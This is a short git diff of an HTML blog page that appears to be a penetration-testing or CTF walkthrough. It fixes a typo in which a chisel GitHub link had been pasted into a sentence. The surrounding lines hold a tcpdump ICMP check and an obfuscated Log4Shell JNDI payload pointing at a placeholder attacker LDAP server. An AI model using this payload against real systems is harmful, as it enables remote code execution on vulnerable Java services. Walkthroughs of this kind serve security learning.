@@ -118,7 +118,7 @@ However, if you go in that direction, we will quickly find ourselves in a rabbit
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo tcpdump -i tun0 icmp
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;And finally whttps://github.com/jpillora/chisele upload our payload:&lt;/p&gt;
+&lt;p&gt;And finally we upload our payload:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
